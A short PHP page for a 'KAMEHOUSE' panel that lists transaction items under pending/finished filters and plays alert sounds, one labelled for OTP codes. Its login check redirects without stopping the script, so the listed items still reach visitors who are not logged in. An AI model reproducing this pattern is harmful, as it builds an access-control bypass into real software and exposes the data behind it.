<?php 
session_start(); 
require('../include/setings.php');
if (!isset($_SESSION["usr-new"])) 
	header("Location: ../");
?>
<head>
	<meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="../assets/img/logo.ico">
	<title>KAMEHOUSE</title>
	<link href="../src/css/pluto-fonts.css" rel="stylesheet">
	<link href="../src/css/layout.css" rel="stylesheet">	
	<script type="text/javascript" src="../src/js/jquery-3.6.0.min.js"></script>	
	<script type="text/javascript" src="../src/js/run.js"></script>
</head>
<body background="../assets/img/FONDOZ.jpg">
	<div class="menu">
		<div class="opciones"><span class="item-menu" 
		style="background-color:#F4F6FA;color:#DD7524; ">Todos</span>
		<span class="item-menu">Pendientes</span> 
		<span class="item-menu">Finalizados</span></div>
		<div class="cerrar"><img src="../assets/img/cerrar-g.svg" width="19"></div>
	</div>
	<div class="items-trans">		
		<?php get_items(); ?>		
	</div>
	<audio id="snd">
		<source src="../assets/snd/timbre.mp3" type="audio/mpeg">
	</audio>
	<audio id="sndOTP">
		<source src="../assets/snd/electrico.mp3" type="audio/mpeg">
	</audio>

	<div class="logo">
		<img src="../assets/img/icono.png" width="30" style="margin:20px 0px;">
		<div style="width: 100%; border-bottom: 1px dashed #a58e8e;"></div>
	</div>	
</body>
<script type="text/javascript" src="../src/js/ready.js"></script>